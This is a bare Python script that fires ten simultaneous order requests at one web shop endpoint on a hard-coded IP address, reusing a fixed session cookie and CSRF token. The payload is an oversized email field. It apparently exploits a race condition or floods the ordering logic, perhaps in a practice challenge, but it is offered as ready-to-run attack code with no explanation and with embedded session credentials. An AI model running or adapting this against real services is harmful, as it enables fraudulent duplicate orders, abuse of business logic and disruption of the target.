import requests
from concurrent.futures import ThreadPoolExecutor
def make_request(url):
    data = {
    'email': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@gmail.com'
        }
    headers = {
        'Host': '158.247.236.165',
        'Content-Length': '31',
        'X-CSRFToken': '7FdoG3ufZS3TuwJ3Ai8C2ttHq6EgPX4vU36CoQL5HMm4R9Im0gNp3FJSnHuy6Prv',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Origin': 'http://158.247.236.165',
        'Referer': 'http://158.247.236.165/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'csrftoken=iQw1X6vSTbpQAnfKjjySu9ITnEZSvjy25epfFTMIB5I1X0e3JhdFvlY4kfPaMbV2; sessionid=dikz63413g6bkwztzcqwndydeobwtiuc',
        'Connection': 'close',
    }
    response = requests.get(url, data=data, headers=headers)
    print(f"Response from {url}: {response.status_code}")

cookies = {

}

urls = [
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/',
   'http://158.247.236.165/product/2/order/'
]

executor = ThreadPoolExecutor()
for url in urls:
    executor.submit(make_request, url)

executor.shutdown(wait=True)
